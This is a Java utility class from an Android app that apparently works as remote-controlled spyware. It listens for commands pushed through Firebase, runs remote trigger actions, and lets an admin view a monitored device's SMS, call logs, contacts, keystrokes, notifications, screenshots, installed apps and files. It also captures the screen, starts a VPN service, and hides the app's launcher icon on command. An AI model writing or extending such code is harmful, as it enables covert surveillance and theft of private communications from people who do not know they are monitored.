package com.vikasyadavnsit.cdc.utils;

import static android.app.Activity.RESULT_OK;
import static android.content.Context.ALARM_SERVICE;
import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;
import static com.vikasyadavnsit.cdc.services.AppUsageStats.hasUsageStatsPermission;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getMessageText;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getShayariData;

import android.app.Activity;
import android.app.AlarmManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.LocationManager;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.activities.MainActivity;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
import com.vikasyadavnsit.cdc.fragment.AdminCallLogsFragment;
import com.vikasyadavnsit.cdc.fragment.AdminContactsFragment;
import com.vikasyadavnsit.cdc.fragment.AdminFileStructureFragment;
import com.vikasyadavnsit.cdc.fragment.AdminInstalledAppsFragment;
import com.vikasyadavnsit.cdc.fragment.AdminScreenStateFragment;
import com.vikasyadavnsit.cdc.fragment.AdminSensorsFragment;
import com.vikasyadavnsit.cdc.fragment.AdminSmsFragment;
import com.vikasyadavnsit.cdc.fragment.RemoteTriggerClickActionsFragment;
import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
import com.vikasyadavnsit.cdc.fragment.MessageFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
import com.vikasyadavnsit.cdc.receiver.ScreenStateBroadcastReceiver;
import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
import com.vikasyadavnsit.cdc.services.ScreenshotService;

import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import java.lang.reflect.Type;
import java.util.Comparator;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.TreeMap;

public class ActionUtils {

    private static Activity context;
    private static final Gson gson = new Gson();
    private static final Map<String, User.AppTriggerSettingsData> clientActionCache = new HashMap<>();

    public static void setContext(Activity activity) {
        context = activity;
        startRemoteControlListener(activity);
    }

    public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
        LoggerUtils.d("ActionUtils", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
        createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
        handleVpnPermissionResult(activity, requestCode, resultCode);
    }

    private static void handleVpnPermissionResult(Activity activity, int requestCode, int resultCode) {
        if (requestCode == AppConstants.VPN_SERVICE_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                LoggerUtils.i("ActionUtils", "VPN permission granted — starting CDCVpnService");
                Intent vpnIntent = new Intent(activity, com.vikasyadavnsit.cdc.services.CDCVpnService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    activity.startForegroundService(vpnIntent);
                } else {
                    activity.startService(vpnIntent);
                }
            } else {
                LoggerUtils.w("ActionUtils", "VPN permission denied by user (resultCode: " + resultCode + ")");
            }
        }
    }




    /**
     * Prompts the user to disable battery optimizations for the app if currently enforced.
     *
     * <p>This opens {@link Settings#ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS} when the app is not
     * exempt, which can improve the reliability of background services.</p>
     *
     * @param activity Activity used to access {@link PowerManager} and start the settings intent.
     */
    public static void checkAndRequestBatteryOptimization(Activity activity) {
        new com.vikasyadavnsit.cdc.permissions.PermissionManager().requestPermission(activity, com.vikasyadavnsit.cdc.enums.PermissionType.BATTERY_OPTIMIZATION);
    }

    /**
     * Registers a {@link BroadcastReceiver} to listen for various device/system events.
     *
     * <p>This builds an {@link IntentFilter} including screen on/off, boot, airplane mode, power
     * connected/disconnected, package changes, connectivity changes, bluetooth state changes, and
     * some time/date events. The receiver used is {@link StatisticsBroadcastReceiver}.</p>
     *
     * @param activity Activity used to call {@link Activity#registerReceiver(BroadcastReceiver, IntentFilter)}.
     */
    public static void registerPhoneStatistics(Activity activity) {
        // Create an intent filter
        IntentFilter filter = new IntentFilter();

        // System broadcast actions
        filter.addAction(Intent.ACTION_SCREEN_OFF); // Device screen turned off
        filter.addAction(Intent.ACTION_SCREEN_ON);  // Device screen turned on
        filter.addAction(Intent.ACTION_USER_PRESENT); // User unlocked the device (screen on)
        filter.addAction(Intent.ACTION_SHUTDOWN); // Device is shutting down
        filter.addAction(Intent.ACTION_REBOOT); // Device is rebooting (requires `REBOOT` permission)
        filter.addAction(Intent.ACTION_BOOT_COMPLETED); // Device boot completed (requires `RECEIVE_BOOT_COMPLETED` permission)
        filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED); // Airplane mode toggled
        filter.addAction(Intent.ACTION_POWER_CONNECTED); // Power source connected (charger plugged in)
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED); // Power source disconnected (charger unplugged)
        filter.addAction(Intent.ACTION_BATTERY_LOW); // Battery level is low
        filter.addAction(Intent.ACTION_HEADSET_PLUG); // Headset plug/unplug event
        filter.addAction(Intent.ACTION_PACKAGE_ADDED); // A package was added
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED); // A package was removed
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED); // A package was replaced
        filter.addAction(Intent.ACTION_PACKAGE_CHANGED); // A package was changed (e.g., app data update)

        // Network state broadcasts
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); // Connectivity change (e.g., network connected/disconnected)

        // Bluetooth broadcasts
        filter.addAction(BluetoothAdapter.ACTION_STATE_CHANGED); // Bluetooth state changed
        filter.addAction(BluetoothDevice.ACTION_ACL_CONNECTED); // Bluetooth device connected
        filter.addAction(BluetoothDevice.ACTION_ACL_DISCONNECTED); // Bluetooth device disconnected

        // Location updates (requires location permissions)
        filter.addAction(LocationManager.PROVIDERS_CHANGED_ACTION); // Location providers changed

        // Other useful actions
        filter.addAction(Intent.ACTION_DATE_CHANGED); // Device date changed
        filter.addAction(Intent.ACTION_TIME_CHANGED); // Device time changed
        filter.addAction(Intent.ACTION_TIMEZONE_CHANGED); // Device timezone changed

        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
    }

    /**
     * Opens the system "Usage access" settings if the app does not currently have usage stats access.
     *
     * @param activity Activity used to start {@link Settings#ACTION_USAGE_ACCESS_SETTINGS}.
     */
    public static void enableAppUsageStats(Activity activity) {
        new com.vikasyadavnsit.cdc.permissions.PermissionManager().requestPermission(activity, com.vikasyadavnsit.cdc.enums.PermissionType.PACKAGE_USAGE_STATS);
    }

    /**
     * Requests exact alarm permission on Android 12+ by opening the corresponding system settings.
     *
     * <p>Uses the static {@link #context} set by {@link #setContext(Activity)}.</p>
     */
    public static void requestExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    /**
     * Checks whether the app can schedule exact alarms.
     *
     * @return {@code true} if exact alarms are allowed (or running on an Android version where they
     * are always allowed); {@code false} otherwise.
     */
    public static boolean canScheduleExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
            return alarmManager.canScheduleExactAlarms();
        }
        return true; // For older versions, exact alarms are always allowed
    }

    /**
     * Starts the MediaProjection consent flow for screen capture.
     *
     * <p>This launches the system screen-capture permission dialog. The result must be handled in
     * {@link #onActivityResult(Activity, int, int, Intent)} to start {@link ScreenshotService}.</p>
     *
     * @param activity Activity used to start the consent intent.
     */
    public static void startMediaProjectionService(Activity activity) {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
    }

    /**
     * Starts {@link ScreenshotService} when MediaProjection permission is granted.
     *
     * <p>This is invoked from {@link #onActivityResult(Activity, int, int, Intent)} and checks the
     * request/result codes. When consent is granted, it passes the result code and intent data to
     * the service as extras.</p>
     *
     * @param activity    Activity used to start the service.
     * @param requestCode Request code from {@code onActivityResult}.
     * @param resultCode  Result code from {@code onActivityResult}.
     * @param data        Result data intent from {@code onActivityResult}.
     */
    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
                activity.startService(serviceIntent);
            }
        }
    }



    /**
     * Processes the RTDB app trigger settings map pushed from Firebase and executes enabled actions.
     *
     * <p>Logic summary:</p>
     * <ul>
     *   <li>Deserializes the incoming object into {@code Map<String, User.AppTriggerSettingsData>}.</li>
     *   <li>If file access exists, mirrors the settings into local Room via {@link ApplicationDataRepository}.</li>
     *   <li>For each enabled trigger, invokes the corresponding {@link com.vikasyadavnsit.cdc.enums.ClickActions} handler.</li>
     * </ul>
     *
     * @param obj Raw Firebase payload (typically a map-like structure).
     */
    public static void performFirebaseAction(Object obj) {
        if (obj == null) return;
        
        User.AppSettings appSettings;
        try {
            // Using a single conversion pass for efficiency
            appSettings = gson.fromJson(gson.toJsonTree(obj), User.AppSettings.class);
        } catch (Exception e) {
            LoggerUtils.e("ActionUtils", "Failed to parse app settings: " + e.getMessage());
            return;
        }
        
        if (appSettings == null) return;

        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = appSettings.getAppTriggerSettingsDataMap();
        if (appTriggerSettingsDataMap == null) return;

        LoggerUtils.d("ActionUtils", "Remote data changed, verifying updates.");

        // Check if anything actually changed globally before expensive operations
        boolean hasAnyChange = false;
        Map<String, User.AppTriggerSettingsData> changedActions = new HashMap<>();

        for (Map.Entry<String, User.AppTriggerSettingsData> entry : appTriggerSettingsDataMap.entrySet()) {
            String key = entry.getKey();
            User.AppTriggerSettingsData newValue = entry.getValue();
            User.AppTriggerSettingsData cachedValue = clientActionCache.get(key);

            if (newValue != null && !newValue.equals(cachedValue)) {
                hasAnyChange = true;
                changedActions.put(key, newValue);
            }
        }

        if (!hasAnyChange) {
            LoggerUtils.d("ActionUtils", "No state changes detected, skipping processing.");
            return;
        }

        // Update Room only if there are changes
        ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
        
        User.AppTriggerSettingsData logSettings = appTriggerSettingsDataMap.get("PUSH_REMOTE_LOGS");
        if (logSettings != null && changedActions.containsKey("PUSH_REMOTE_LOGS")) {
            LoggerUtils.updateRemoteConfig(logSettings.isEnabled(), logSettings.getLogLevels());
        }

        LoggerUtils.d("ActionUtils", "Processing " + changedActions.size() + " changed Remote Firebase Actions");
        changedActions.forEach((key, value) -> {
            if (value != null && value.isEnabled()) {
                if (value.getClickActions() != null) {
                    LoggerUtils.d("ActionUtils", "Performing Action: " + key);
                    value.getClickActions().execute(context, value);
                }
            }
            // Update cache after processing
            clientActionCache.put(key, value);
        });

        // Sync current permission status back to Firebase only if we performed actions
        FirebaseUtils.syncAllPermissionStatuses(context);
    }

    /**
     * Applies a personalized message update (from Firebase or cached default) to the UI and prefs.
     *
     * @param obj Raw Firebase value for the message; may be {@code null}.
     */
    public static void performMessageAction(Object obj) {
        LoggerUtils.d("ActionUtils", "Performing Message Action");
        String message = Objects.isNull(obj) ? getMessageText(context) : obj.toString();
        SharedPreferenceUtils.updateMessageText(context, message);
        MessageFragment.updateMessage(message);
    }

    /**
     * Parses the flat user details from Firebase payload.
     */
    public static Map<String, User> parseFlatUserDetails(Object obj) {
        Type type = new TypeToken<Map<String, User>>() {}.getType();
        return new Gson().fromJson(new Gson().toJson(obj), type);
    }

    /**
     * Populates the Settings "admin" user dropdown with user details.
     */
    public static void performFlatUserDetailsActions(Map<String, User> userMap) {
        LoggerUtils.d("ActionUtils", "populating all users in admin setting dropdown");
        SettingsFragment.populateUserDropdown(context, userMap);
    }

    /**
     * Populates the Settings "admin" user dropdown with user details fetched from Firebase.
     *
     * @param obj Raw Firebase payload containing a map of users.
     */
    @Deprecated
    public static void performFlatUserDetailsActions(Object obj) {
        Map<String, User> userMap = parseFlatUserDetails(obj);
        performFlatUserDetailsActions(userMap);
    }

    /**
     * Displays a selected user's click-action trigger settings in the UI.
     *
     * @param obj Raw Firebase payload containing the user's trigger settings map.
     */
    public static void getAndUpdateAndroidUserClickActions(Object obj) {
        LoggerUtils.d("ActionUtils", "showing a user click actions permissions");
        User.AppSettings appSettings = null;
        if (obj != null) {
            try {
                appSettings = gson.fromJson(gson.toJsonTree(obj), User.AppSettings.class);
            } catch (Exception e) {
                LoggerUtils.e("ActionUtils", "Failed to parse admin click actions: " + e.getMessage());
            }
        }
        
        if (appSettings == null) appSettings = new User.AppSettings();
        
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = appSettings.getAppTriggerSettingsDataMap();
        if (appTriggerSettingsDataMap == null) appTriggerSettingsDataMap = new HashMap<>();

        // Merge any newly added ClickActions not yet stored in Firebase with default settings
        for (ClickActions action : ClickActions.values()) {
            com.vikasyadavnsit.cdc.data.User.AppTriggerSettingsData data = appTriggerSettingsDataMap.get(action.name());
            if (data == null) {
                data = com.vikasyadavnsit.cdc.data.User.AppTriggerSettingsData.builder()
                        .type(action.getTriggerType())
                        .enabled(false)
                        .repeatable(false)
                        .maxRepetitions(1)
                        .interval(0)
                        .actionStatus(ActionStatus.IDLE)
                        .clickActions(action)
                        .uploadDataSnapshot(true)
                        .deleteLocalData(false)
                        .saveOnLocalFile(true)
                        .build();
                appTriggerSettingsDataMap.put(action.name(), data);
            } else {
                // Ensure type and enum reference is always correct even for existing data
                data.setType(action.getTriggerType());
                data.setClickActions(action);
            }
        }

        RemoteTriggerClickActionsFragment.addDynamicButtons(context, appTriggerSettingsDataMap);
    }

    /**
     * Displays a selected user's keystrokes feed in the UI, sorted by timestamp (descending).
     *
     * @param obj Raw Firebase payload containing keystroke records.
     */
    @Deprecated
    public static void displayAndroidUserKeystrokes(Object obj) {
        // Deprecated: KeyStrokesFragment now handles its own data fetching 
        // using the new hierarchical structure.
    }

    /**
     * Displays a selected user's captured notifications in the UI, sorted by timestamp (descending).
     *
     * @param obj Raw Firebase payload containing notification records.
     */
    public static void displayAndroidUserAccessibilityNotification(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user accessibility notification");
        TreeMap<String, NotificationData> allNotifications = new TreeMap<>(Comparator.reverseOrder());
        
        if (obj == null) {
            AccessibilityNotificationFragment.displayNotifications(context, allNotifications);
            return;
        }

        try {
            Gson gson = new Gson();
            String json = gson.toJson(obj);

            // Attempt to parse nested structure: {date: {app: {pushKey: notification}}}
            Type nestedType = new TypeToken<Map<String, Object>>() {}.getType();
            Map<String, Object> rootMap = gson.fromJson(json, nestedType);

            if (rootMap != null) {
                boolean parsedAny = false;
                for (Object dateVal : rootMap.values()) {
                    if (dateVal instanceof Map) {
                        Map<?, ?> appMap = (Map<?, ?>) dateVal;
                        for (Object appVal : appMap.values()) {
                            if (appVal instanceof Map) {
                                Map<?, ?> recordMap = (Map<?, ?>) appVal;
                                for (Map.Entry<?, ?> entry : recordMap.entrySet()) {
                                    try {
                                        // Attempt to parse individual notification
                                        String recordJson = gson.toJson(entry.getValue());
                                        NotificationData nd = gson.fromJson(recordJson, NotificationData.class);
                                        if (nd != null) {
                                            String key = entry.getKey().toString();
                                            allNotifications.put(key, nd);
                                            parsedAny = true;
                                        }
                                    } catch (Exception ignored) {}
                                }
                            }
                        }
                    }
                }

                if (!parsedAny) {
                    // Fallback to legacy flat structure: {pushKey: notification}
                    Type flatType = new TypeToken<Map<String, NotificationData>>() {}.getType();
                    Map<String, NotificationData> flat = gson.fromJson(json, flatType);
                    if (flat != null) allNotifications.putAll(flat);
                }
            }
        } catch (Exception e) {
            LoggerUtils.e("ActionUtils", "Error parsing notifications: " + e.getMessage());
        }
        
        AccessibilityNotificationFragment.displayNotifications(context, allNotifications);
    }

    /**
     * Displays a selected user's system app usage statistics report data in the UI.
     *
     * @param obj Raw Firebase payload containing app usage report data grouped by date.
     */
    public static void displaySystemAppUsageStatisticsReportData(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user system app usage statistics");
        Type type = new TypeToken<TreeMap<String, TreeMap<String, AppUsageReportData>>>() {
        }.getType();
        TreeMap<String, TreeMap<String, AppUsageReportData>> appUsageStatisticsReportDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        SystemAppUsageStatisticsFragment.displaySystemAppUsageStatistics(context, appUsageStatisticsReportDataMap);
    }

    public static void displayRemoteSms(Object obj) {
        AdminSmsFragment.displaySms(context, parseFirebaseMap(obj));
    }

    public static void displayRemoteCallLogs(Object obj) {
        AdminCallLogsFragment.displayCallLogs(context, parseFirebaseMap(obj));
    }

    public static void displayRemoteContacts(Object obj) {
        AdminContactsFragment.displayContacts(context, parseFirebaseMap(obj));
    }

    private static Map<String, Map<String, String>> parseFirebaseMap(Object obj) {
        if (obj == null) return new HashMap<>();
        Map<String, Map<String, String>> result = new HashMap<>();
        Gson gson = new Gson();

        try {
            String json = gson.toJson(obj);
            if (json.startsWith("[")) {
                Type listType = new TypeToken<List<Map<String, String>>>() {}.getType();
                List<Map<String, String>> list = gson.fromJson(json, listType);
                if (list != null) {
                    for (int i = 0; i < list.size(); i++) {
                        Map<String, String> item = list.get(i);
                        if (item != null) {
                            String id = item.get("_id");
                            if (id == null) id = String.valueOf(i);
                            result.put(id, item);
                        }
                    }
                }
            } else {
                // Map structure: could be flat {id: record} or nested {group: {id: record}}
                Map<String, Object> rawMap = gson.fromJson(json, new TypeToken<Map<String, Object>>() {}.getType());
                for (Map.Entry<String, Object> entry : rawMap.entrySet()) {
                    if (entry.getValue() instanceof Map) {
                        @SuppressWarnings("unchecked")
                        Map<String, Object> innerMap = (Map<String, Object>) entry.getValue();
                        
                        // Heuristic: if any value in innerMap is also a Map, this entry is a group (date/initial)
                        boolean isGroup = innerMap.values().stream().anyMatch(v -> v instanceof Map);
                        
                        if (isGroup) {
                            for (Object recordObj : innerMap.values()) {
                                if (recordObj instanceof Map) {
                                    @SuppressWarnings("unchecked")
                                    Map<String, String> record = convertToStringMap((Map<String, Object>) recordObj);
                                    String id = record.get("_id");
                                    if (id != null) result.put(id, record);
                                }
                            }
                        } else {
                            // This entry is likely a direct record ID -> data
                            @SuppressWarnings("unchecked")
                            Map<String, String> record = convertToStringMap(innerMap);
                            String id = record.get("_id");
                            if (id == null) id = entry.getKey();
                            result.put(id, record);
                        }
                    }
                }
            }
        } catch (Exception e) {
            LoggerUtils.e("ActionUtils", "Error parsing Firebase map: " + e.getMessage());
        }
        return result;
    }

    private static Map<String, String> convertToStringMap(Map<String, Object> map) {
        Map<String, String> result = new HashMap<>();
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            result.put(entry.getKey(), String.valueOf(entry.getValue()));
        }
        return result;
    }

    public static void displayRemoteSensors(Object obj) {
        Type type = new TypeToken<Map<String, Object>>() {}.getType();
        Map<String, Object> data = new Gson().fromJson(new Gson().toJson(obj), type);
        AdminSensorsFragment.displaySensors(context, data);
    }

    public static void displayRemoteScreenshot(Object obj) {
        com.vikasyadavnsit.cdc.fragment.AdminScreenshotFragment.displayScreenshot(context, obj);
    }

    public static void displayRemoteInstalledApps(Object obj) {
        AdminInstalledAppsFragment.displayInstalledApps(context, parseFirebaseMap(obj));
    }

    public static void displayRemoteScreenState(Object obj) {
        AdminScreenStateFragment.displayScreenState(context, obj);
    }

    public static void displayRemoteDeviceInfo(Object obj) {
        com.vikasyadavnsit.cdc.fragment.AdminDeviceInfoFragment.displayDeviceInfo(context, obj);
    }

    private static void startRemoteControlListener(Context ctx) {
        FirebaseUtils.listenForRemoteControl(new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(@androidx.annotation.NonNull com.google.firebase.database.DataSnapshot snapshot) {
                for (com.google.firebase.database.DataSnapshot cmd : snapshot.getChildren()) {
                    String feature = cmd.getKey();
                    Object cmdVal = cmd.child("command").getValue();
                    if (feature == null || cmdVal == null) continue;
                    String command = String.valueOf(cmdVal);
                    executeRemoteControl(ctx.getApplicationContext(), feature, command);
                    cmd.getRef().removeValue();
                }
            }
            @Override
            public void onCancelled(@androidx.annotation.NonNull com.google.firebase.database.DatabaseError error) {}
        });
    }

    private static void executeRemoteControl(Context ctx, String feature, String command) {
        boolean enable = "enable".equalsIgnoreCase(command);
        if ("hideIcon".equalsIgnoreCase(feature)) {
            toggleAppIcon(ctx, enable);
        }
    }

    private static void toggleAppIcon(Context ctx, boolean show) {
        if (SharedPreferenceUtils.getUserRole(ctx) == com.vikasyadavnsit.cdc.enums.UserRole.ADMIN) {
            LoggerUtils.w("ActionUtils", "toggleAppIcon skipped — admin device");
            return;
        }
        try {
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            int state = show
                    ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                    : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            pm.setComponentEnabledSetting(
                    new android.content.ComponentName(ctx, MainActivity.class),
                    state,
                    android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            LoggerUtils.e("ActionUtils", "toggleAppIcon failed: " + e.getMessage());
        }
    }

    public static void registerScreenStateMonitor(Context context) {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        Context appContext = context.getApplicationContext();
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            appContext.registerReceiver(new ScreenStateBroadcastReceiver(), filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            appContext.registerReceiver(new ScreenStateBroadcastReceiver(), filter);
        }
    }

    public static void getDirectoryStructure(Activity activity) {
        getDirectoryStructure(activity, "", false);
    }

    public static void getDirectoryStructure(Activity activity, String path, boolean isFullBFS) {
        com.vikasyadavnsit.cdc.utils.FileExplorer.captureDirectoryStructure(activity.getApplicationContext(), path, isFullBFS);
    }

    public static void startVpnService(Activity activity) {
        Intent intent = android.net.VpnService.prepare(activity);
        if (intent != null) {
            activity.startActivityForResult(intent, AppConstants.VPN_SERVICE_REQUEST_CODE);
        } else {
            startVpnServiceInternal(activity);
        }
    }

    public static void startVpnService(Context context) {
        if (android.net.VpnService.prepare(context) == null) {
            startVpnServiceInternal(context);
        } else {
            LoggerUtils.w("ActionUtils", "VPN permission not granted, cannot start service from background");
        }
    }

    private static void startVpnServiceInternal(Context context) {
        Intent vpnIntent = new Intent(context, com.vikasyadavnsit.cdc.services.CDCVpnService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(vpnIntent);
        } else {
            context.startService(vpnIntent);
        }
    }

    public static void stopVpnService(Context context) {
        Intent intent = new Intent(context, com.vikasyadavnsit.cdc.services.CDCVpnService.class);
        intent.putExtra("stop", true);
        context.startService(intent);
    }
}
